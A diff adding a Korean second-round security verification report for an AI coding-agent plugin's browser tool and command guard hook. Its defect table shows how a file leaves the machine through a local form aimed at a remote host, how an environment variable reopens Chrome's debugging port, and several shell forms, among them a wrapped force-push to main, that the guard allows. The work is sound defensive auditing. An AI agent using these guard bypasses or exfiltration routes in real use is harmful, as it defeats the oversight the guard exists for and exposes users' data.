@@ -207,3 +207,80 @@ dogfood 명령 (지시 그대로, `MIS_STATE_HOME`은 임시, cwd는 빈 git 저
 - 추적되지 않는 파일(사용자 전역 훅이 만드는 `.omc/`, 빌드 산출물 등)이 하나라도 있으면 `team shutdown`이 그 worktree를 남긴다. OMC를 함께 쓰는 사용자는 자동 정리를 사실상 받지 못한다 (데이터 보존 쪽이라 안전하지만 수동 정리가 필요).
 - ADR-0003은 "외부 사이트 요청"도 매번 ask한다고 적었다. 이 규칙은 자격 증명 기능(M9) 문맥이라고 해석했으며, 현재 `mis browse goto https://…`는 allow다. 해석이 다르면 결함이 된다.
 - 팀 워커는 `--allowedTools Bash` 전체에 acceptEdits로 돈다. guard 훅이 주 방어선이어서 D5 같은 guard 파서 허점이 워커에도 그대로 적용된다.
+
+## 2차 검증 (round 2)
+
+- 대상: 같은 worktree, 브랜치 `m8-wip`, 커밋 `ad4e38c` (1차 수정 커밋). 검증자는 구현에 관여하지 않았다. 커밋 메시지·PROGRESS의 "수정됨" 주장은 근거로 쓰지 않았고, 아래 수치는 모두 직접 실행한 결과다.
+- 환경: 1차와 같음 (macOS, Chrome 155, `*.test` → 127.0.0.1 매핑, 로컬 서버만 사용, tmux 전용 소켓 `-L misr2`). 작업 디렉터리는 저장소 밖 `/tmp/mis-r2-*`이다. 수정 전 코드(`f0c4baf`)는 `git archive`로 저장소 밖에 풀어 비교에만 썼다.
+
+### 판정: **DEFECTS FOUND**
+
+1차의 D0–D12는 재현 절차와 변형 모두에서 고쳐진 것을 확인했다 (D3은 반대 방향으로 지나치게 고쳐짐, 아래 R2-2). 그러나 1차가 남긴 "원격 upload" 위험의 변형이 그대로 뚫린다 (R2-1, MEDIUM). 로컬 페이지의 폼이 원격 호스트로 파일을 보내면 `--remote`도, guard의 ask도 없이 파일이 기기 밖으로 나간다.
+
+### 실행 명령과 수치
+
+| 항목 | 결과 |
+|---|---|
+| `npm test` 1회차 | tests 480 / pass 480 / fail 0 / skipped 0, 76 s |
+| `npm test` 2회차 | 480 / 480 / 0 / 0, 157 s |
+| `npm test` 3회차 | 480 / 480 / 0 / 0, 151 s |
+| flake | 없음 (`not ok` 0건). 참고: 처음 돌린 3회 묶음은 버렸다. 공유 scratchpad의 로그를 다른 세션이 덮어써서 M9 테스트(657개)가 섞였기 때문이다. 위 수치는 전용 디렉터리에 다시 돌린 결과다 |
+| `claude plugin validate .` | `✔ Validation passed` |
+| M8 통합 테스트 5개 파일을 전용 `TMPDIR`로 실행 | 35/35 pass. `mis-browse-home-*`·`mis-browse-out-*` 잔여 0개 (D11 수정 확인). 다른 테스트 파일은 `mis-test-*` 15개, `mis-notmux-*`, `mis-pdf-home-*`, `mis-vv-*`, `mis-clone-*`, `mis-origin-*`를 남긴다 (M8 이전부터 있던 공용 `makeRepo` 동작, 참고) |
+
+### 1차 결함 재검증
+
+| ID | 판정 | 증거 (직접 재현) |
+|---|---|---|
+| D0 blob/about:blank | **PASS** | `shop.test/blob.html` → URL `blob:http://shop.test:…` → `js`·`storage`·`eval` 모두 `non-local page (http://shop.test:…)`로 거부. 변형: `window.open('about:blank')` 팝업, `window.open('')`에 `document.write`한 팝업, 원격 페이지 안의 `srcdoc` iframe, `about:blank` iframe(부모가 내용을 씀) → 모두 그 사이트 출처로 판정되어 거부. `data:` iframe → `opaque origin`으로 거부. `--remote`를 주면 실행됨 |
+| D1 chain goto 경합 | **PASS** | 1차 재현 그대로 6/6 거부 (`chain stopped at step 3 (js …): … non-local`). 느린 페이지(`/slow`, 900 ms) + `storage` 3/3 거부. 페이지가 스스로 원격으로 이동하는 경우(`redir.html`, 300 ms 뒤 `location=` 원격): `js` → `Inspected target navigated or closed`, `upload` → `uniqueContextId not found`. 즉 검사한 문서에 고정되어, 다른 문서에서 실행되지 않고 실패한다. 업로드 요청 0건 |
+| D2 CDP 포트 | **PASS** | Chrome 명령줄 `--remote-debugging-pipe`, 프로필에 `DevToolsActivePort` 없음, Chrome과 자식 프로세스 11개에 TCP LISTEN 없음 (`lsof`). 데몬을 `kill -9` 하면 pipe가 닫혀 Chrome도 같이 종료되고, 다음 명령이 정상 기동한다 (1차의 고아 Chrome 위험도 사라짐). 단 환경 변수로 다시 열 수 있다 → R2-3 |
+| D3 visual-verdict | **PASS (과보정, R2-2)** | Demo vs Second → score 0 fail (1차 98 pass). 같은 페이지 → 100 pass. 문구는 `note: The pixel score is only an aid…`. `qa.md` 8.4는 "Read both images … Your visual judgment decides … A high score alone never ends the loop"로 바뀜. browse 스킬도 같다 |
+| D4 범위 문서화 | **PASS** | README "Not in M8 (planned for M9)"와 PROGRESS M8-01~03 행에 `media`·`inspect`·`ux-audit`·`style`류·`tab-each`·`snapshot -C`/`@c`·`state`·`focus`·`memory`·`mis launch`·qa-tester tmux가 적혔다. gap-matrix §5.4·§7에서 M8로 표시된 명령에서 `HANDLERS` 키와 README 목록을 빼면 남는 것이 없다. `m9-wip`의 `docs/research/m9-plan.md`에 E1~E4·C2·A8로 실제로 들어 있다. 단 `m8-wip`에는 그 파일이 없어서 PROGRESS의 "M9 E4/C2/A8"이 이 브랜치에서는 가리키는 곳이 없다 (LOW, 병합하면 해소) |
+| D5 guard 함수 파서 | **PASS (변형 일부 남음, R2-4)** | `mis() { node "${CLAUDE_PLUGIN_ROOT}/…/mis.mjs" "$@"; }; mis browse cdp` → ask. 변형 46개 중 ask: 맨 `mis`, 함수 감싼 함수 3단, alias(`m=mis`, `m='mis browse'`, 줄바꿈 뒤 사용), `"$1" "$2"`, `"${@}"`, `--remote`를 함수 안에 붙인 형태, `command`/`env`/`VAR=`/`nice`/`timeout`/`node --no-warnings`/`./scripts`/`cd &&`/`bash -c`/`zsh -c`/`M="node …"; $M`/`$X` 변수/따옴표 쪼개기/`\cdp`/`xargs mis browse cdp`/`exec`/서브셸/`{}`/`if`/`for`/`$()`/백틱. upload `--remote`(단독·chain)는 "data leaves this machine" 문구로 ask. `--remote=1`·`--remot`는 guard가 allow하지만 데몬도 원격으로 보지 않고 거부한다 (일관됨, 우회 아님) |
+| D6 back/forward/reload | **PASS** | `Back to …/`, `Forward to …/second.html`, `Reloaded …/second.html`. 해시 이동(`#x`), `pushState`(`/pushed`), 느린 페이지에서 back/forward도 이동 후 URL을 출력. 204 응답(`writeHead(204)` 전용 서버) → 0 s 안에 `net::ERR_ABORTED`로 돌아오고 현재 페이지는 그대로 유지 |
+| D7 shutdown 뒤 status | **PASS** | 워커 2개·작업 4개(ok, SLEEP, SLEEP, ok) 중간에 shutdown → `counts {pending 1, in_progress 0, done 1, stopped 2}`, 워커 둘 다 `stopped`, `worker: "custom"` (override). fake worker 프로세스 0개, tmux 서버 없음 |
+| D8 companion 심볼릭 링크 | **PASS** | 밖을 가리키는 절대·상대 링크, 밖 디렉터리 링크 → 404, 목록에도 없음. 안을 가리키는 파일 링크·디렉터리 링크 경유 → 200 |
+| D9 문구 | **PASS** | `team start`/`status`가 override면 `custom`과 `workerCmd`를 표시. 스킬 지연 문구는 "0.2–0.7 s"로 바뀜 |
+| D10 프로필 잔여 | **PASS** | goto·screenshot 뒤 `stop` 5회 반복 → 5/5 삭제. idle 종료(3 s) → 약 6 s 뒤 데몬 종료와 함께 삭제. `kill -9` 뒤 다음 명령 → 이전 프로필 삭제 |
+| D11 테스트 임시 디렉터리 | **PASS** | 위 표 (browse 테스트 한정) |
+| D12 zsh `mis` 함수 | **PASS** | 스킬의 함수를 `/bin/zsh -c`, `/bin/bash -c`에서 그대로 실행 → `mis browse status` exit 0. 스킬 11개가 같은 함수 문구를 쓴다. dogfood에서 모델이 처음부터 함수 형태를 썼고 실패가 없었다 (아래). `agents/implementer.md:13`에는 아직 "`mis` means … `node "<plugin>/scripts/mis.mjs"`"가 남아 있다. 브리프의 명령을 쓰라는 뜻이라 영향은 작지만, 회귀 테스트는 `skills/`만 검사한다 (LOW) |
+
+### 수정이 바꾼 동작 검토 (과제 3)
+
+- **`about:`·`data:` 문서는 이제 로컬이 아님**: 타당하다. 판정 기준이 URL이 아니라 브라우저가 알려 주는 실행 컨텍스트의 출처(`Runtime.executionContextCreated`의 `origin`)로 바뀌어서, 원격이 만든 blob·about:blank는 원격으로 보고 불투명 출처는 막는다 (fail closed). 대가가 있다. 새 탭(`newtab`, about:blank)이나 `goto data:…`에서 `js 1+1`이 `--remote`를 요구해 guard가 묻는다. 거부 문구 "can read or change its cookies and storage"는 불투명 출처에는 맞지 않는다. 불투명 출처는 저장소가 없어서 보안상 얻는 것은 거의 없다 (참고, 결함 아님).
+- **`load-html`이 `file://`로 이동**: 타당하다. 출처가 `file://`(로컬)로 남고 상대 링크가 동작한다 (`lh.html` → `file:///…/lh.html`, `js document.title` 실행). 확장자 제한(`.html/.htm/.xhtml/.svg`)과 50 MB 제한은 유지된다 (`/etc/hosts`, `.mjs` 거부). 다만 `file://` 페이지는 무조건 로컬이라서 R2-1의 한 경로가 된다.
+- **조건부 iframe 단언** (`if (sel.code === 0) … else /frame has no document/`): 이 Chrome에서는 원격(cross-site) iframe을 수정 전 코드와 수정 후 코드 모두 `frame '#x'`로 고를 수 없다 (`frame has no document yet`). 따라서 이 테스트에서 "프레임 기준 판정" 쪽 분기는 이 기기에서 한 번도 실행되지 않는다. 실패하는 쪽으로 닫혀 있지만, 이 기기에서는 테스트되지 않는다. 1차 표의 "원격 iframe 안 js → 거부" 행은 두 버전 모두에서 재현할 수 없었다. 내가 원격 페이지 안의 같은 출처 `srcdoc`·`about:blank`·`data:` iframe으로 직접 확인한 프레임 판정은 동작한다. 테스트를 이 형태(선택 가능한 프레임)로 바꾸면 분기가 실제로 검증된다 (LOW, 테스트 공백).
+- **PNG 기대 점수 변경**: 다른 페이지는 이제 fail(0)이 되어 1차 D3은 해결됐다. 그러나 `=== 99` → `< 100`, `=== 50` → `< 50`으로 바뀐 단언은 아래 R2-2의 0점도 통과시킨다. 일부 약해졌다. 새 단위 테스트(줄 3개 vs 4개 → < 50, 10줄 vs 11줄 → 50 이상 100 미만)는 의미가 있다.
+
+### 실사용 기록 (dogfood)
+
+지시된 명령 그대로 실행했다. `MIS_STATE_HOME`은 임시, cwd는 빈 git 저장소, 페이지는 내가 띄운 `http://localhost:53705/`(버튼 "Show" → "Magic MANGO-9").
+- 순서: `make-it-ship:browse` 스킬 → `curl`로 서버 확인 → `mis() { node "…/mis.mjs" "$@"; }; mis browse goto … && mis browse snapshot -i` (`@e1 [button] "Show"`) → `mis browse click @e1 && mis browse text '#o'` → **"Magic MANGO-9"** 정확히 보고.
+- 6턴, $0.15, `success`. 1차에서 두 번 나온 `$M` exit 127 실패가 없었다 (D12 효과).
+
+### 새로 찾은 결함
+
+| ID | 심각도 | 내용 | 재현 | 위치 |
+|---|---|---|---|---|
+| R2-1 | **MEDIUM** | 원격 upload 규칙 우회. 게이트는 **페이지의 출처**만 보고 **파일이 가는 곳**은 보지 않는다. 로컬 페이지(`file://` 또는 localhost)의 폼 `action`이나 JS가 원격 호스트를 향하면 `upload` + `click`만으로 파일이 기기 밖으로 나간다. `--remote`도, guard의 ask도 없다. 로컬 프런트엔드가 원격 백엔드로 업로드하는 구성은 흔하고, 스킬은 "internal data must not go to outside services"를 이유로 이 규칙을 둔다 | `localform.html`(`<form method=post action="http://shop.test:P/up" enctype=multipart/form-data><input type=file id=f name=f><button>`)를 저장소에 두고 `goto localform.html` → `upload '#f' secret.txt` → `Uploaded 1 file(s)` → `click button` → `Clicked button → http://shop.test:P/up`. 서버 로그 `UPLOAD shop.test:53705 /up 197` | `scripts/lib/browse/actions.mjs runCommand` (GATED는 `pageContext`의 출처만 확인), `upload` 핸들러 |
+| R2-2 | LOW | visual-verdict 과보정. 점수의 분모가 "공유 배경이 아닌 픽셀"이 되면서, 작은 차이가 큰 실패로 나온다. 1픽셀 차이 → 0 fail (수정 전 99 pass). 같은 페이지를 2px 아래로 민 경우 → 37 fail (수정 전 99 pass). 텍스트 한 줄 추가 → 68 revise, 버튼 색만 바꿈 → 66 revise. 스킬이 모델의 판단을 우선하라고 하므로 영향은 제한적이다. 하지만 `verdict: fail`·exit 1은 `mis check`로 등록한 자동 검사를 거짓으로 실패시킬 수 있다 | `encodePng`로 만든 100×100 흰 이미지 두 장 중 하나의 픽셀 1개를 검게 → `mis visual-verdict b.png a.png` → `0 fail 1`. 같은 HTML을 `margin:20px` / `margin:22px 20px`로 찍은 viewport 스크린샷 → `37 fail` | `scripts/lib/png.mjs compareImages` |
+| R2-3 | LOW | `MIS_BROWSE_CHROME_ARGS`를 쓰면 D2가 다시 열린다. guard는 이 환경 변수를 보지 않는다. `MIS_TEAM_WORKER_CMD`는 ask하는 선례가 있다. 같은 경로로 `--disable-web-security` 같은 인자도 넘길 수 있다 | `MIS_BROWSE_CHROME_ARGS='--remote-debugging-port=0' mis browse goto http://127.0.0.1:P/` → guard allow → `DevToolsActivePort` 생성, Chrome이 `127.0.0.1:61360` LISTEN, `curl /json/list`가 토큰 없이 탭 목록을 돌려줌 | `scripts/lib/browse/daemon.mjs:15`, `policy.mjs` |
+| R2-4 | LOW | guard가 위치 인자를 다시 짜는 형태는 풀지 못한다: `f() { local s=$1; shift; mis $s "$@"; }; f browse cdp X.y`, `f() { mis "$1" "${@:2}"; }`, `set -- browse cdp X.y; mis "$@"`, `a=(browse cdp X.y); mis "${a[@]}"`, `mis browse $(echo cdp) X.y`, `echo cdp \| xargs -I{} mis browse {} X.y` → 모두 allow. 같은 형태로 `git push --force origin main`도 allow된다 (`git push --force …` 단독은 deny). 즉 M8 이전부터 있던 정적 guard의 공통 한계이며, `\| sh`·`sh 파일`·`source`도 같다 | hook JSON으로 `scripts/guard.mjs` 실행 | `scripts/lib/shell.mjs` |
+| R2-5 | LOW | 테스트 공백: 위 "조건부 iframe 단언". 그리고 PNG 단언 완화 (위 과제 3 항목) | — | `tests/integration/mis-browse.test.mjs` D0 테스트, `tests/unit/png.test.mjs` |
+| R2-6 | LOW | 문서 잔여: `agents/implementer.md:13`의 `mis` 설명. `m8-wip`에 없는 `m9-plan.md` 항목 ID 참조 | — | `agents/implementer.md`, `docs/PROGRESS.md:145-147` |
+
+### 남은 위험 (결함으로 세지 않음)
+
+- 업로드 외의 유출 경로: `fill`로 비밀 문자열을 원격 폼에 넣기, `goto https://원격/?q=…`, 로컬 페이지 JS의 `fetch(원격, {method:'POST'})`는 게이트가 없다. 다만 에이전트는 Bash로 `curl`도 쓸 수 있어서, 브라우저 게이트만으로 막을 수 있는 범위가 아니다.
+- 데몬 HTTP API는 `state.json`(0600)의 토큰을 아는 같은 사용자 프로세스라면 `remote:true`로 직접 호출할 수 있다. guard는 `mis`를 거치지 않는 `curl`을 보지 못한다.
+- 원격(cross-site) iframe은 이 Chrome에서 `frame`으로 고를 수 없다 (수정 전부터). 원격 결제 위젯 같은 프레임 안의 조작은 지원되지 않는다.
+- 1차의 나머지 남은 위험(idle 30분, team shutdown이 추적 안 된 파일 때문에 worktree를 남김 등)은 그대로다.
+
+### 프로세스 정리
+
+- 내가 띄운 것만 PID나 상태 파일로 정리했다. 로컬 사이트 서버(PID 파일로 kill), 204 전용 서버, 브라우저 데몬 4곳(`mis browse stop`: 검증 저장소, r3, dogfood, 수정 전 코드), companion(`stop`, 프로세스 사라짐 확인), tmux 소켓 `misr2`(shutdown 뒤 `no server running`). 마지막 확인: `/tmp/mis-r2-*`를 가리키는 프로세스 0개.
+- 다른 worktree(`make-it-ship-m9`)의 테스트 데몬은 건드리지 않았다.
+- 저장소 변경은 이 절을 덧붙인 것뿐이다. 커밋하지 않았다. 임시 디렉터리는 저장소 밖에 만들었고 끝에 지웠다.
+
+ROUND2: DEFECTS FOUND
